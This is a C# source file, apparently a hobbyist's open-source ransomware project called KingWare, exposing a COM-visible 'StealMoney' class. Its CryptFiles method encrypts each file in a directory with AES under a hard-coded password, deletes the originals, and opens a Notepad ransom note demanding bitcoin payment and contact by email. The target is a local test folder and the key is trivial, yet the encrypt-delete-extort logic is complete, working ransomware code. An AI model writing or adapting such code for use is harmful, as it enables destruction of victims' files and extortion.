using System;
using System.ComponentModel;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;

namespace KingWare
{
    [ComVisible(true)]
    [Guid("9A31C896-FE03-4EFD-B8E4-6A7AC79F3635")]
    [InterfaceType(ComInterfaceType.InterfaceIsDual)]
    public interface IStealMoney
    {
        [Description("Crypt files in the host")]
        void CryptFiles();
    }

    [ComVisible(true)]
    [ProgId("KingWare.StealMoney")]
    [Guid("D6B4AA5C-2588-435A-8C8B-1FB54EC4D783")]
    [ClassInterface(ClassInterfaceType.None)]
    public class StealMoney : IStealMoney
    {
        public void CryptFiles()
        {
            string dir = @"D:\Dev course\C#\learning C#\OpenSource\KingWare\KingWare\TestFiles";

            foreach (var file in Directory.GetFiles(dir))
            {
                string Filename = Path.GetFileName(file);

                if(!Filename.Contains(".king"))
                {
                    string encryptedFilePath = Path.Combine(dir, Filename + ".king");
                    SharpAESCrypt.SharpAESCrypt.Encrypt("password", file, encryptedFilePath);
                    File.Delete(file);
                }
            }
            
            // inform the user of the attack
            OpenNotepad();
        }

        private void OpenNotepad()
        {
            string tempText = "You thought you were smart. \n\nYOU GOT HACKED. \n################################# \n\nPay us on our bitcoin account: df205DAF329DFDFdsf935gfd \nand send us a mail at: yougothacked@king.com";
            string filePath = Path.GetTempFileName() + ".txt";
            File.WriteAllText(filePath, tempText);

            ProcessStartInfo processStartInfo = new ProcessStartInfo("notepad.exe", filePath);
            Process.Start(processStartInfo);
        }
    }
}
